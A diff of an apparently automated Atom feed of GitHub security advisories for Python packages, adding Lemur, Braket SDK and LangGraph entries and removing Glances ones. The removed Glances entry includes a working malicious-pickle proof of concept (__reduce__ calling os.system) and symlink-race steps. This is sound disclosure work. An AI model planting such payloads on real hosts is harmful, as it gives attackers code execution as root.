@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-06-25T18:22:14.256Z</updated>
+    <updated>2026-06-25T20:26:08.546Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,262 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[lemur] Lemur has an authorization bypass in StrictRolePermission / AuthorityCreatorPermission]]></title>
+        <id>https://github.com/advisories/GHSA-qcqw-jwxc-2hqg</id>
+        <link href="https://github.com/advisories/GHSA-qcqw-jwxc-2hqg"/>
+        <updated>2026-06-25T18:48:39.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>StrictRolePermission</code> and <code>AuthorityCreatorPermission</code> in <code>lemur/auth/permissions.py</code> call <code>flask_principal.Permission.__init__()</code> with zero <code>Need</code>s when their config flags are unset. Both flags defaulted to <code>False</code> in code prior to the fix, so this was the state of any Lemur install that hadn't explicitly opted in.</p>
+<p>Flask-Principal's <code>Permission.allows()</code> returns <code>True</code> whenever <code>self.needs</code> is empty. The <code>.can()</code> gate therefore passes for every authenticated identity, including the lowest-privilege role Lemur ships (<code>read-only</code>).</p>
+<p>A user holding only <code>read-only</code> can create root Certificate Authorities, create and edit notifications (an SSRF sink), create domain entries, and upload arbitrary certificates. These classes are the sole authorization check on those endpoints.</p>
+<h2 id="root-cause">Root Cause</h2>
+<pre><code class="language-python"># lemur/auth/permissions.py
+class AuthorityCreatorPermission(Permission):
+    def __init__(self):
+        requires_admin = current_app.config.get("ADMIN_ONLY_AUTHORITY_CREATION", False)
+        if requires_admin:
+            super().__init__(RoleNeed("admin"))
+        else:
+            super().__init__()              # empty Need set
+
+class StrictRolePermission(Permission):
+    def __init__(self):
+        strict_role_enforcement = current_app.config.get("LEMUR_STRICT_ROLE_ENFORCEMENT", False)
+        if strict_role_enforcement:
+            needs = [RoleNeed("admin"), RoleNeed("operator")]
+            super().__init__(*needs)
+        else:
+            super().__init__()              # empty Need set
+</code></pre>
+<p><code>flask_principal.Permission.allows()</code> (upstream, v0.4.0):</p>
+<pre><code class="language-python">def allows(self, identity):
+    if self.needs and not self.needs.intersection(identity.provides):
+        return False
+    ...
+    return True
+</code></pre>
+<p>When <code>self.needs == set()</code>, the first guard is falsy and is skipped. <code>excludes</code> is also empty, so <code>allows()</code> returns <code>True</code> for any identity. <code>AuthenticatedResource</code> (the parent class for these views) sets <code>method_decorators = [login_required]</code>, which checks authentication only, no role. So the permission <code>.can()</code> is the only authorization layer in front of these endpoints.</p>
+<h2 id="affected-endpoints">Affected Endpoints</h2>
+<p>Views whose only authorization check is <code>StrictRolePermission().can()</code> or <code>AuthorityCreatorPermission().can()</code>:</p>
+<table>
+<thead>
+<tr>
+<th>Method</th>
+<th>Path</th>
+<th>Source</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>/api/1/authorities</td>
+<td>lemur/authorities/views.py:231</td>
+</tr>
+<tr>
+<td>POST</td>
+<td>/api/1/certificates/upload</td>
+<td>lemur/certificates/views.py:651</td>
+</tr>
+<tr>
+<td>POST</td>
+<td>/api/1/pending_certificates/&lt;id&gt;/upload</td>
+<td>lemur/pending_certificates/views.py:545</td>
+</tr>
+<tr>
+<td>POST</td>
+<td>/api/1/notifications</td>
+<td>lemur/notifications/views.py:227</td>
+</tr>
+<tr>
+<td>PUT/DEL</td>
+<td>/api/1/notifications/&lt;id&gt;</td>
+<td>lemur/notifications/views.py:370,384</td>
+</tr>
+<tr>
+<td>POST</td>
+<td>/api/1/domains</td>
+<td>lemur/domains/views.py:131</td>
+</tr>
+</tbody></table>
+<p><code>POST /api/1/authorities</code> is gated by <code>AuthorityCreatorPermission().can() and StrictRolePermission().can()</code>; both have empty Needs by default. The other rows are gated by <code>StrictRolePermission().can()</code> alone.</p>
+<p>Note on scope: <code>PUT /api/1/authorities/&lt;id&gt;</code> also references <code>StrictRolePermission</code>, but its gate is <code>AuthorityPermission(...).can() and StrictRolePermission().can()</code>. <code>AuthorityPermission</code> is constructed with non-empty Needs (<code>RoleNeed("admin")</code> plus authority-scoped needs), so that endpoint is not bypassable by a <code>read-only</code> user and is excluded from this report.</p>
+<h2 id="impact">Impact</h2>
+<p>A user holding only the <code>read-only</code> role can:</p>
+<ol>
+<li>Create root Certificate Authorities. CA cert and private key are persisted in Lemur's DB with the attacker as owner. Any internal trust store that pins Lemur-managed roots can now be signed against by the attacker.</li>
+<li>Upload arbitrary certificates via <code>/certificates/upload</code>, including attacker-supplied keys with destinations such as AWS push.</li>
+<li>Create or modify notifications, which reach an SSRF sink (see related finding F3, Slack notification webhook).</li>
+<li>Mark arbitrary domains as <code>sensitive</code>, manipulating Lemur's domain registry and the cert-issuance approval path.</li>
+</ol>
+<p>Combined with any low-privilege credential leak (phished employee, leaked SSO token) or insider access, this is a pivot from "any authenticated identity" to control of the PKI issuance plane.</p>
+<h2 id="remediation">Remediation</h2>
+<p>The config flag defaults for <code>ADMIN_ONLY_AUTHORITY_CREATION</code> and <code>LEMUR_STRICT_ROLE_ENFORCEMENT</code> were changed from <code>False</code> to <code>True</code>. Restrictive role enforcement is now active on all default installs without requiring explicit configuration.</p>
+<pre><code class="language-python">class AuthorityCreatorPermission(Permission):
+    def __init__(self):
+        requires_admin = current_app.config.get("ADMIN_ONLY_AUTHORITY_CREATION", True)
+        ...
+
+class StrictRolePermission(Permission):
+    def __init__(self):
+        strict_role_enforcement = current_app.config.get("LEMUR_STRICT_ROLE_ENFORCEMENT", True)
+        ...
+</code></pre>
+<p><strong>Note:</strong> The opt-out branches (empty Needs) remain in the code. Operators who explicitly set <code>ADMIN_ONLY_AUTHORITY_CREATION = False</code> or <code>LEMUR_STRICT_ROLE_ENFORCEMENT = False</code> in their config will reintroduce the bypass. These flags should be left unset or set to <code>True</code>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Netflix/lemur/security/advisories/GHSA-qcqw-jwxc-2hqg">https://github.com/Netflix/lemur/security/advisories/GHSA-qcqw-jwxc-2hqg</a></li>
+<li><a href="https://github.com/advisories/GHSA-qcqw-jwxc-2hqg">https://github.com/advisories/GHSA-qcqw-jwxc-2hqg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-qcqw-jwxc-2hqg</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-25T18:48:39.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[amazon-braket-sdk] amazon-braket-sdk vulnerable to Insecure Deserialization via pickle.loads()]]></title>
+        <id>https://github.com/advisories/GHSA-g697-2xrc-gc46</id>
+        <link href="https://github.com/advisories/GHSA-g697-2xrc-gc46"/>
+        <updated>2026-06-25T18:34:19.000Z</updated>
+        <content type="html"><![CDATA[<p><strong>Summary</strong>
+Amazon Braket SDK is an open-source Python library for interacting with the Amazon Braket quantum computing service, including managing hybrid quantum jobs and retrieving job results. An issue exists where, under certain circumstances, a remote authenticated user with S3 write access to a Braket job output bucket can achieve arbitrary code execution by exploiting insecure deserialization in the job results processing component.</p>
+<p><strong>Impact</strong>
+The SDK's deserialize_values() function reads the dataFormat field directly from the job results JSON file without validation. An actor with write access to the victim's S3 job output bucket can modify the dataFormat field in results.json from PLAINTEXT to pickled_v4 and replace dataDictionary values with base64-encoded executable payloads. When the victim calls job.result(), load_job_result(), or load_job_checkpoint() as part of their normal Braket workflow, the SDK calls pickle.loads() on the actor-controlled data, executing arbitrary code with the victim's permissions.</p>
+<p><strong>Impacted versions</strong>: &gt;= v1.10.0 AND &lt; 1.117.0</p>
+<p><strong>Patches</strong>
+This issue has been addressed in amazon-braket-sdk version 1.117.0. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes.</p>
+<p><strong>Workarounds</strong>
+If users cannot upgrade immediately:</p>
+<ol>
+<li>Restrict S3 bucket policies on the Braket job output buckets to enforce least-privilege access, ensuring only trusted principals have s3:PutObject permissions. This limits an an actor's ability to plant an executable payload.</li>
+<li>Validate the dataFormat field in job result metadata before calling job.result(). Refuse to process results where the format is pickled_v4 if it did not explicitly configure pickle serialization.</li>
+</ol>
+<p><strong>References</strong>
+If users have any questions or comments about this advisory, amazon-braket-sdk asks that users contact AWS Security via the <a href="https://aws.amazon.com/security/vulnerability-reporting">vulnerability reporting page</a> or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/amazon-braket/amazon-braket-sdk-python/security/advisories/GHSA-g697-2xrc-gc46">https://github.com/amazon-braket/amazon-braket-sdk-python/security/advisories/GHSA-g697-2xrc-gc46</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-9291">https://nvd.nist.gov/vuln/detail/CVE-2026-9291</a></li>
+<li><a href="https://aws.amazon.com/security/security-bulletins/2026-036-aws">https://aws.amazon.com/security/security-bulletins/2026-036-aws</a></li>
+<li><a href="https://github.com/amazon-braket/amazon-braket-sdk-python/releases/tag/v1.117.0">https://github.com/amazon-braket/amazon-braket-sdk-python/releases/tag/v1.117.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-g697-2xrc-gc46">https://github.com/advisories/GHSA-g697-2xrc-gc46</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g697-2xrc-gc46</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-25T18:34:18.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[langgraph-sdk] LangGraph SDK has unsafe URL path construction]]></title>
+        <id>https://github.com/advisories/GHSA-w39p-vh2g-g8g5</id>
+        <link href="https://github.com/advisories/GHSA-w39p-vh2g-g8g5"/>
+        <updated>2026-06-25T18:32:38.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>langgraph-sdk</code> constructs HTTP request paths for resource operations by interpolating caller-supplied identifier values into URL templates. Without sanitization of those values, identifiers that contain characters with special meaning in URL paths could cause the resulting request to address a different resource (and potentially a different resource type) than the SDK method's call site indicates. In deployments where the SDK receives identifier values that originate from untrusted sources, this could result in unintended access, modification, or deletion of resources beyond the calling user's authorization scope.</p>
+<p>This issue is most consequential in deployments that:</p>
+<ul>
+<li>forward end-user-supplied values directly into SDK identifier parameters without first validating them against an expected format (such as a UUID), and</li>
+<li>rely on URL-prefix-based authorization at an upstream layer (reverse proxy, edge gateway, WAF), where the authorization decision is made on the SDK call's intended path rather than on the final delivered request path.</li>
+</ul>
+<p>There have no evidence of this behavior being triggered in the wild. This change is intended to reduce the surface available when caller-supplied identifier values originate from untrusted sources.</p>
+<h2 id="affected-users--systems">Affected users / systems</h2>
+<p>You may be affected if you:</p>
+<ul>
+<li>use <code>langgraph-sdk</code> (Python) to address resources by identifier, and</li>
+<li>pass identifier values into SDK methods that originate from end-user input, untrusted third-party callers, or any source that does not validate identifier format before the SDK call.</li>
+</ul>
+<p>Applications that validate identifier values (for example, by parsing them as UUIDs and rejecting anything that does not parse) before passing them to SDK methods are not affected. Validated UUIDs round-trip through the SDK request path unchanged.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li>Potential <strong>unintended access, modification, or deletion</strong> of resources via SDK methods called for a different resource type, when caller-supplied identifier values are not validated.</li>
+<li>In deployments with prefix-based authorization at an upstream layer, the authorization decision and the final delivered request path may diverge.</li>
+<li>Confidentiality: disclosure of resource content beyond the authorization scope of the calling user.</li>
+<li>Integrity: modification or deletion of resources beyond the authorization scope of the calling user.</li>
+</ul>
+<h2 id="patches--mitigation">Patches / mitigation</h2>
+<p>The SDK now applies path-segment encoding to identifier values before they are interpolated into request URL templates. After this change, identifier values that contain characters with special meaning in URL paths are transmitted as encoded byte sequences and routed to the resource the SDK method's call site indicates.</p>
+<h2 id="compatibility">Compatibility</h2>
+<p>Identifier values that match the standard UUID format, or any other format that contains only characters safe to transmit unencoded in URL path segments, round-trip through the SDK request path unchanged. Applications that already validate identifier inputs see no behavioral change.</p>
+<h2 id="operational-guidance">Operational guidance</h2>
+<ul>
+<li>Validate identifier values (typically as UUIDs) at the boundary where untrusted input enters the application, before passing them to SDK methods.</li>
+<li>For deployments relying on URL-prefix-based authorization upstream of LangGraph, prefer authorization at the LangGraph server layer or on parsed-and-validated request paths rather than on raw URL prefixes.</li>
+</ul>
+<h2 id="langsmith--hosted-deployments-note">LangSmith / hosted deployments note</h2>
+<p>This issue affects the SDK that runs in caller applications. The LangGraph server runtime, including LangSmith-hosted deployments, receives ordinary HTTP requests on documented routes and is not itself affected by this issue. Applications that consume LangSmith-hosted services via <code>langgraph-sdk</code> and pass untrusted identifier values to SDK methods should upgrade.</p>
+<p>First reported by: pucagit (CyStack).</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/langchain-ai/langgraph/security/advisories/GHSA-w39p-vh2g-g8g5">https://github.com/langchain-ai/langgraph/security/advisories/GHSA-w39p-vh2g-g8g5</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48776">https://nvd.nist.gov/vuln/detail/CVE-2026-48776</a></li>
+<li><a href="https://github.com/langchain-ai/langgraph/releases/tag/sdk%3D%3D0.3.15">https://github.com/langchain-ai/langgraph/releases/tag/sdk%3D%3D0.3.15</a></li>
+<li><a href="https://github.com/advisories/GHSA-w39p-vh2g-g8g5">https://github.com/advisories/GHSA-w39p-vh2g-g8g5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-w39p-vh2g-g8g5</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-25T18:32:35.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[langgraph-checkpoint] LangGraph Checkpoint: Unsafe JSON deserialization in checkpoint loading]]></title>
+        <id>https://github.com/advisories/GHSA-fjqc-hq36-qh5p</id>
+        <link href="https://github.com/advisories/GHSA-fjqc-hq36-qh5p"/>
+        <updated>2026-06-25T18:25:43.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>LangGraph's <code>JsonPlusSerializer</code> can reconstruct Python objects from JSON checkpoint payloads. Under conditions where someone could modify checkpoint bytes at rest in the backing store, the deserialization path could reconstruct objects beyond what the application expects, which could in turn result in code execution at checkpoint load time.</p>
+<p>This is a defense-in-depth issue. The affected behavior is reachable only when checkpoint bytes at rest in the backing store can be modified by an unauthorized party. In most deployments that prerequisite already implies a serious incident; the additional concern is turning "checkpoint-store write access" into code execution in the application runtime.</p>
+<p>There is no evidence of this behavior being triggered in the wild, and the team is not aware of a practical path to it in existing deployments today. This change is intended to reduce the surface available after a checkpoint-store incident.</p>
+<h2 id="affected-users--systems">Affected users / systems</h2>
+<p>Users may be affected if they:</p>
+<ul>
+<li>use a persistent checkpointer (database, remote store, shared filesystem, etc.) with the default <code>JsonPlusSerializer</code>,</li>
+<li>load/resume from checkpoints, and</li>
+<li>operate in an environment where write access to the checkpoint store could be obtained by an unauthorized party.</li>
+</ul>
+<p>The default checkpoint serializer in all shipped checkpointer backends (<code>PostgresSaver</code>, <code>SqliteSaver</code>, and their async counterparts) is <code>JsonPlusSerializer</code>, so applications generally do not need to opt in to be in scope.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li>Potential <strong>arbitrary code execution</strong> or other unsafe side effects during checkpoint deserialization.</li>
+<li>Escalation from "write access to the checkpoint store" to "code execution in the LangGraph worker process," which may expose runtime secrets or provide access to other systems the runtime can reach.</li>
+</ul>
+<h2 id="patches--mitigation">Patches / mitigation</h2>
+<p>The JSON deserialization path has been narrowed so that revival is restricted to default-constructor reconstruction using the args/kwargs carried in the payload. The framework's own encoder has not relied on the removed behavior for produced checkpoints since the msgpack migration, so this change does not affect freshly written checkpoints. Legacy payloads that already used the default constructor as their first option continue to revive correctly via that same path.</p>
+<h2 id="compatibility">Compatibility</h2>
+<p>A narrow legacy-resume regression applies to pre-October-2025 checkpoints of pydantic models where the original payload depended on a no-validation fallback factory to recover from incompatible schema evolution. After this change, such payloads return <code>None</code> from the revival path and fall through to the langchain-core reviver, which surfaces the raw dict rather than reconstructing the model.</p>
+<h2 id="operational-guidance">Operational guidance</h2>
+<ul>
+<li>Treat checkpoint stores as integrity-sensitive. Restrict write access and rotate credentials if unauthorized access is suspected.</li>
+<li>Avoid providing custom JSON revival hooks that reconstruct arbitrary types unless checkpoint data is fully trusted.</li>
+</ul>
+<h2 id="langsmith--hosted-deployments-note">LangSmith / hosted deployments note</h2>
+<p>The team is not aware of this issue presenting concern for existing LangSmith-hosted deployments. The described conditions require modification of the checkpoint persistence layer used by the deployment; typical hosted configurations are designed to prevent such access.</p>
+<p>First reported by: pucagit (CyStack).</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/langchain-ai/langgraph/security/advisories/GHSA-fjqc-hq36-qh5p">https://github.com/langchain-ai/langgraph/security/advisories/GHSA-fjqc-hq36-qh5p</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48775">https://nvd.nist.gov/vuln/detail/CVE-2026-48775</a></li>
+<li><a href="https://github.com/advisories/GHSA-fjqc-hq36-qh5p">https://github.com/advisories/GHSA-fjqc-hq36-qh5p</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-fjqc-hq36-qh5p</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-25T18:25:42.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[justhtml] justhtml: to_markdown() code-span blank-line breakout enables XSS]]></title>
         <id>https://github.com/advisories/GHSA-jf6w-2mvx-633j</id>
@@ -1496,506 +1752,5 @@ if acao:
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-06-22T21:27:24.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[glances] Glances has Insecure Pickle Deserialization in its Version Cache that Leads to Arbitrary Code Execution]]></title>
-        <id>https://github.com/advisories/GHSA-9837-48hr-q32j</id>
-        <link href="https://github.com/advisories/GHSA-9837-48hr-q32j"/>
-        <updated>2026-06-22T21:21:08.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>glances/outdated.py</code> uses <code>pickle.load()</code> to read a version-check cache file stored at a predictable, world-accessible path (<code>~/.cache/glances/glances-version.db</code> or <code>$XDG_CACHE_HOME/glances/glances-version.db</code>). No integrity check, signature verification, or format validation is performed before deserialization.  An attacker with write access to that path — through any of several realistic local or container-level scenarios — can plant a malicious pickle file and achieve arbitrary code execution as the OS user running Glances the next time it starts with version checking enabled (the default).</p>
-<hr>
-<h3 id="details">Details</h3>
-<p><strong>Affected file:</strong> <code>glances/outdated.py</code>, method <code>Outdated._load_cache()</code>, line 121</p>
-<p><strong>Direct URL (commit 04579778e733d705898a169e049dc84772c852da):</strong></p>
-<ul>
-<li><a href="https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/outdated.py#L121">https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/outdated.py#L121</a></li>
-</ul>
-<pre><code class="language-python"># outdated.py  (_load_cache, line 119-127)
-try:
-    with open(self.cache_file, 'rb') as f:
-        cached_data = pickle.load(f)          # ← no integrity check
-except Exception as e:
-    logger.debug(f"Cannot read version from cache file: {self.cache_file} ({e})")
-    ...
-</code></pre>
-<p><code>self.cache_file</code> is constructed from the XDG cache directory path at <code>Outdated.__init__()</code>:</p>
-<pre><code class="language-python"># outdated.py  (__init__)
-self.cache_file = os.path.join(
-    user_cache_dir('glances')[0],
-    'glances-version.db'
-)
-</code></pre>
-<p>On a default Linux installation this resolves to <code>/home/john/.cache/glances/glances-version.db</code> (or <code>/root/.cache/glances/…</code> when Glances runs as root).</p>
-<p>Python's <code>pickle</code> module is an execution-capable serialisation format: any class that implements <code>__reduce__</code> can embed an arbitrary callable and argument tuple that Python will invoke unconditionally at <code>pickle.load()</code> time.  There is no safe subset of pickle; the only safe mitigation is to not use it for untrusted data.</p>
-<p>The code was verified on x86_64 Linux, Python 3.13, Glances 4.5.5_dev1 (commit 04579778e733d705898a169e049dc84772c852da).  A malicious pickle crafted with <code>os.system()</code> via <code>__reduce__</code> executed the injected shell command successfully before the surrounding Python code raised a <code>TypeError</code>.</p>
-<hr>
-<h3 id="poc">PoC</h3>
-<p><strong>Special configuration required</strong></p>
-<p>No non-default Glances configuration is needed.  Version checking is enabled by default (<code>check_update = true</code>).  The only pre condition is that the attacker can write to the Glances user's XDG cache directory — see the attack scenarios below for how this arises in practice.</p>
-<hr>
-<p><strong>Attack scenario A — local privilege escalation (shared multi-user host)</strong></p>
-<p>Prerequisites: Glances runs periodically (e.g. via systemd or cron) as a privileged user (root or a dedicated monitoring account).  The attacker is an unprivileged local user who has write access to the Glances user's <code>~/.cache/glances/</code> directory (e.g. the directory or an ancestor is group- or world-writable, or was created with overly permissive umask).</p>
-<p><strong>Step 1 — Identify the cache path</strong></p>
-<pre><code class="language-bash">python3 -c "from glances.config import user_cache_dir; print(user_cache_dir()[0])"
-# Example output: /root/.cache/glances
-</code></pre>
-<p><strong>Step 2 — Craft and plant a malicious pickle</strong></p>
-<pre><code class="language-python">import pickle, os, pathlib
-
-class MaliciousPayload:
-    def __reduce__(self):
-        # This command runs as the Glances process user
-        cmd = 'id &gt;&gt; /tmp/glances_rce_proof.txt'
-        return (os.system, (cmd,))
-
-cache_dir  = pathlib.Path('/root/.cache/glances')   # adjust to target
-cache_file = cache_dir / 'glances-version.db'
-cache_dir.mkdir(parents=True, exist_ok=True)
-cache_file.write_bytes(pickle.dumps(MaliciousPayload()))
-print(f'Payload written to {cache_file}')
-</code></pre>
-<p><strong>Step 3 — Wait for Glances to start (or restart it)</strong></p>
-<p>Glances calls <code>_load_cache()</code> automatically at startup when <code>check_update = true</code> (the compiled-in default). No special configuration is required by the attacker.</p>
-<p><strong>Step 4 — Verify execution</strong></p>
-<pre><code class="language-bash">cat /tmp/glances_rce_proof.txt
-# uid=0(root) gid=0(root) groups=0(root)    ← output from the Glances-user context
-</code></pre>
-<hr>
-<p><strong>Attack scenario B — container / shared-volume poisoning</strong></p>
-<p>A compromised container that shares a Docker/Podman volume with the Glances container can write to the cache path on the shared volume. The next time Glances restarts (e.g. after a rolling update), the payload executes inside the Glances container with its privileges.</p>
-<hr>
-<p><strong>Attack scenario C — symlink race (TOCTOU)</strong></p>
-<p>Before the Glances cache directory is created for the first time (e.g. on a fresh installation), an attacker with write access to <code>~/.cache/</code> can create a symlink:</p>
-<pre><code class="language-bash">mkdir -p /home/john/.cache
-ln -s /tmp/attacker_controlled /home/john/.cache/glances
-</code></pre>
-<p>When Glances writes its legitimate cache file it writes instead to <code>/tmp/attacker_controlled/glances-version.db</code>, which the attacker can replace with the malicious pickle before the next start.</p>
-<hr>
-<p><strong>Minimal self-contained reproduction</strong></p>
-<pre><code class="language-python">import sys, os, pickle, pathlib, argparse
-
-sys.path.insert(0, '/path/to/glances')   # adjust to local clone
-
-FAKE_CACHE = pathlib.Path('/tmp/glances_test_cache')
-CACHE_FILE = FAKE_CACHE / 'glances-version.db'
-FAKE_CACHE.mkdir(parents=True, exist_ok=True)
-
-class Exploit:
-    def __reduce__(self):
-        return (os.system, ('echo RCE_confirmed &gt;&gt; /tmp/glances_rce.txt',))
-
-CACHE_FILE.write_bytes(pickle.dumps(Exploit()))
-
-# Reproduce the exact Glances code path
-from glances.outdated import Outdated
-obj = object.__new__(Outdated)
-obj.args = argparse.Namespace(disable_check_update=False, time=2)
-obj.data = {}
-obj.cache_file = str(CACHE_FILE)
-
-try:
-    obj._load_cache()            # pickle.load() fires here
-except Exception:
-    pass                         # expected: int not subscriptable
-
-import time; time.sleep(0.2)
-print(pathlib.Path('/tmp/glances_rce.txt').read_text())
-# Prints: RCE_confirmed
-</code></pre>
-<hr>
-<h3 id="impact">Impact</h3>
-<p><strong>Vulnerability type:</strong> Insecure Deserialization (CWE-502)</p>
-<p><strong>Who is impacted:</strong> Any system where Glances is run with version checking enabled (the default) in a shared environment where a less-privileged process can write to the Glances user's XDG cache directory, or in any containerised deployment using shared volumes.</p>
-<p><strong>Impact:</strong></p>
-<ul>
-<li><strong>Confidentiality:</strong> Full — the attacker gains code execution in the context of the Glances process and can read any data accessible to that user.</li>
-<li><strong>Integrity:</strong> Full — arbitrary commands can modify files, install persistence mechanisms, or alter system state.</li>
-<li><strong>Availability:</strong> Full — the Glances process and, if running as root, the system can be disrupted.</li>
-</ul>
-<p>On many deployments Glances is run as root (required to access hardware performance counters without specific capabilities), meaning successful exploitation yields full root code execution without any further privilege escalation step.</p>
-<hr>
-<h3 id="suggested-fix">Suggested Fix</h3>
-<p>Replace <code>pickle</code> with <code>json</code> for the version cache.  The data stored is a simple Python dictionary containing two string values and a <code>datetime</code> object; a JSON representation is straightforward:</p>
-<pre><code class="language-python">import json
-from datetime import datetime
-
-# Saving
-with open(self.cache_file, 'w', encoding='utf-8') as f:
-    json.dump({
-        'installed_version': self.installed_version(),
-        'latest_version':    latest,
-        'refresh_date':      datetime.now().isoformat(),
-    }, f)
-
-# Loading
-with open(self.cache_file, 'r', encoding='utf-8') as f:
-    cached_data = json.load(f)
-    cached_data['refresh_date'] = datetime.fromisoformat(cached_data['refresh_date'])
-</code></pre>
-<p>If pickle is retained for any reason, the cache file must be protected with an HMAC keyed from a Glances-managed secret (e.g. a random key stored in the Glances config directory, which should itself be mode 0600).</p>
-<p>As an additional hardening measure, restrict the permissions of the Glances cache directory to 0700 at creation time.</p>
-<hr>
-<h3 id="responsible-disclosure">Responsible Disclosure</h3>
-<p>The AFINE Team is committed to responsible / coordinated disclosure. The AFINE Team will not publish details of this vulnerability or release exploit code publicly until a fix has been released, or 90 days have elapsed from the date of this report, whichever comes first.</p>
-<hr>
-<h3 id="credits">Credits</h3>
-<p>This issue was identified by Michał Majchrowicz and Marcin Wyczechowski, members of the AFINE Team.</p>
-<hr>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-9837-48hr-q32j">https://github.com/nicolargo/glances/security/advisories/GHSA-9837-48hr-q32j</a></li>
-<li><a href="https://github.com/nicolargo/glances/releases/tag/v4.5.5">https://github.com/nicolargo/glances/releases/tag/v4.5.5</a></li>
-<li><a href="https://github.com/advisories/GHSA-9837-48hr-q32j">https://github.com/advisories/GHSA-9837-48hr-q32j</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-9837-48hr-q32j</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-22T21:21:07.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[glances] Glances is Vulnerable to Command Injection via KVM/QEMU VM Domain Names in glances/plugins/vms/engines/virsh.py]]></title>
-        <id>https://github.com/advisories/GHSA-v5r2-qh84-fjx5</id>
-        <link href="https://github.com/advisories/GHSA-v5r2-qh84-fjx5"/>
-        <updated>2026-06-22T21:14:07.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The Glances KVM/QEMU monitoring engine (<code>glances/plugins/vms/engines/virsh.py</code>) passes VM domain names, read directly from <code>virsh list --all</code> output, into f-string command templates that are processed by <code>secure_popen()</code>. <code>secure_popen()</code> is explicitly designed to interpret <code>&amp;&amp;</code>, <code>|</code>, and <code>&gt;</code> as shell operators.  Because domain names are never sanitised before interpolation, any user with the ability to create or rename a KVM/QEMU virtual machine can execute arbitrary commands as the OS user running Glances — commonly root on hypervisor hosts.</p>
-<hr>
-<h3 id="details">Details</h3>
-<p><strong>Affected file:</strong> <code>glances/plugins/vms/engines/virsh.py</code></p>
-<p><strong>Direct URLs (commit 04579778e733d705898a169e049dc84772c852da):</strong></p>
-<ul>
-<li><a href="https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/plugins/vms/engines/virsh.py#L185">https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/plugins/vms/engines/virsh.py#L185</a></li>
-<li><a href="https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/plugins/vms/engines/virsh.py#L204">https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/plugins/vms/engines/virsh.py#L204</a></li>
-</ul>
-<p>The vulnerable calls are on lines 185 and 204:</p>
-<pre><code class="language-python"># line 185  (update_stats)
-ret_cmd = secure_popen(f'{VIRSH_PATH} {VIRSH_DOMAIN_STATS_OPTIONS} {domain}')
-
-# line 204  (update_title)
-ret_cmd = secure_popen(f'{VIRSH_PATH} {VIRSH_DOMAIN_TITLE_OPTIONS} {domain}')
-</code></pre>
-<p><code>domain</code> is the name string parsed from the output of <code>virsh list --all</code> (line 59–78 in the same file); no sanitisation is applied to it at  any point before it reaches <code>secure_popen()</code>.</p>
